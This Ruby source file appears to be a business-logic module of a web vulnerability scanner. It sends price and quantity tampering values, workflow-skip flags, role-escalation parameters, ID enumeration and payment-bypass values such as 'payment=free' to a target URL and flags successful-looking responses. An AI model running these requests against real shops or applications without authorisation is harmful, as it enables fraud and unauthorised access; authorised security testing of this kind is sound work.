require 'uri'
require_relative '../utils/network'
require_relative '../utils/colorize'

class BusinessLogic
  def self.test_price_manipulation(url, product_id, original_price)
    prices = [
      original_price * -1,
      0,
      0.01,
      original_price / 2,
      original_price * 0.99,
      original_price * 1.01,
      original_price * 100,
      "test",
      "null",
      "undefined",
      "NaN",
      "Infinity",
      "-Infinity"
    ]
    
    results = []
    prices.each do |price|
      begin
        test_url = "#{url}?product_id=#{product_id}&price=#{price}"
        response = Network.http_request(test_url, :post)
        
        if response && response.code == "200"
          results << {
            price: price,
            status: response.code,
            vulnerable: response.body.include?("success") || response.body.include?("purchased")
          }
        end
      rescue
      end
    end
    
    results
  end

  def self.test_quantity_manipulation(url, product_id, max_quantity)
    quantities = [
      -1,
      0,
      1,
      max_quantity - 1,
      max_quantity,
      max_quantity + 1,
      max_quantity * 10,
      max_quantity * 100,
      "test",
      "null",
      "undefined",
      "NaN",
      "Infinity",
      "-Infinity"
    ]
    
    results = []
    quantities.each do |quantity|
      begin
        test_url = "#{url}?product_id=#{product_id}&quantity=#{quantity}"
        response = Network.http_request(test_url, :post)
        
        if response && response.code == "200"
          results << {
            quantity: quantity,
            status: response.code,
            vulnerable: response.body.include?("success") || response.body.include?("added")
          }
        end
      rescue
      end
    end
    
    results
  end

  def self.test_workflow_bypass(url, current_step, target_step)
    bypasses = [
      "#{url}?step=#{target_step}",
      "#{url}?step=#{target_step}&skip=true",
      "#{url}?step=#{target_step}&bypass=true",
      "#{url}?step=#{target_step}&force=true",
      "#{url}?step=#{target_step}&admin=true",
      "#{url}?step=#{target_step}&debug=true",
      "#{url}?step=#{target_step}&test=true",
      "#{url}?step=#{target_step}&dev=true",
      "#{url}?step=#{target_step}&staging=true",
      "#{url}?step=#{target_step}&production=false"
    ]
    
    results = []
    bypasses.each do |bypass_url|
      begin
        response = Network.http_request(bypass_url)
        
        if response && response.code == "200"
          results << {
            url: bypass_url,
            status: response.code,
            vulnerable: !response.body.include?("error") && !response.body.include?("forbidden")
          }
        end
      rescue
      end
    end
    
    results
  end

  def self.test_privilege_escalation(url, user_role, target_role)
    roles = [
      target_role,
      "admin",
      "administrator",
      "root",
      "superuser",
      "super_admin",
      "moderator",
      "manager",
      "owner"
    ]
    
    results = []
    roles.each do |role|
      begin
        test_url = "#{url}?role=#{role}"
        response = Network.http_request(test_url, :post)
        
        if response && response.code == "200"
          results << {
            role: role,
            status: response.code,
            vulnerable: response.body.include?("admin") || response.body.include?("privileges")
          }
        end
      rescue
      end
    end
    
    results
  end

  def self.test_authorization_bypass(url, user_id, target_id)
    test_ids = [
      target_id,
      target_id + 1,
      target_id - 1,
      target_id * 2,
      "admin",
      "1",
      "0",
      "-1",
      "null",
      "undefined"
    ]
    
    results = []
    test_ids.each do |test_id|
      begin
        test_url = "#{url}?id=#{test_id}"
        response = Network.http_request(test_url)
        
        if response && response.code == "200"
          results << {
            id: test_id,
            status: response.code,
            vulnerable: response.body.length > 0 && !response.body.include?("forbidden")
          }
        end
      rescue
      end
    end
    
    results
  end

  def self.test_payment_bypass(url)
    bypasses = [
      "#{url}?payment=free",
      "#{url}?payment=0",
      "#{url}?payment=-1",
      "#{url}?payment=null",
      "#{url}?payment=undefined",
      "#{url}?payment=test",
      "#{url}?payment=bypass",
      "#{url}?payment=skip",
      "#{url}?payment=free&admin=true",
      "#{url}?payment=0&debug=true"
    ]
    
    results = []
    bypasses.each do |bypass_url|
      begin
        response = Network.http_request(bypass_url, :post)
        
        if response && response.code == "200"
          results << {
            url: bypass_url,
            status: response.code,
            vulnerable: response.body.include?("success") || response.body.include?("completed")
          }
        end
      rescue
      end
    end
    
    results
  end
end

